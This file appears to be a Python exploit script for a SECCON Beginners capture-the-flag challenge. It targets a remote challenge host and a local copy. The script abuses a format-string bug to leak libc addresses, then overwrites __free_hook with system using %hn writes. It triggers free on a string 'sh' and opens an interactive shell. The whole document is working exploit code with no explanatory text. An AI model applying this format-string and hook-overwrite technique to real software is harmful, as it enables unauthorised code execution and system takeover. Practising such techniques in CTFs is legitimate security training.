import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def add(name):
    read_until(f,">>")
    f.write("1\n")
    read_until(f,">>")
    f.write(name+"\n")

def comment(id,buf):
    read_until(f,">>")
    f.write("2\n")
    read_until(f,">>")
    f.write(id+"\n")
    read_until(f,">>")
    f.write(buf+"\n")

def main():
    add("sh"+"A\0")
    comment("0","BBBAAAA %p %p %p %p %p %p %p")

    # leak libc
    read_until(f,"AAAA ")
    read_until(f," 0x")
    libc = int(f.read(8),16) - _IO_2_1_stdin_offset
    print "libc: ",hex(libc)
    system = libc + system_offset
    print "system: ",hex(system)
    free_hook = libc + free_hook_offset
    print "free_hook: ",hex(free_hook)

    '''
    # leak text
    read_until(f," 0x")
    text = int(f.read(8),16)
    bss = (text&~0xfff)+0x3020
    print "bss: ",hex(bss)
    list = bss + 0x2c
    print "list: ",hex(list)
    '''

    # set system in __free_hook
    system1 = u(p(system)[:2]+"\x00"*2)
    print hex(system1)
    system2 = u(p(system)[2:]+"\x00"*2)
    print hex(system2)
    comment("0","%"+str(system1)+"x%10$hn%"+"P"+p(free_hook))
    comment("0","%"+str(system2)+"x%10$hn%"+"P"+p(free_hook+2))

    # trigger free
    f.write("\n")

    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("pwn1.chall.beginners.seccon.jp", 21735)
        _IO_2_1_stdin_offset = 0x001b25a0
        system_offset = 0x0003ada0
        free_hook_offset = 0x001b38b0
        main()
    else:
        s, f = sock("localhost", 21735)
        _IO_2_1_stdin_offset = 0x001b05a0
        system_offset = 0x0003a940
        free_hook_offset = 0x001b18b0
        main()
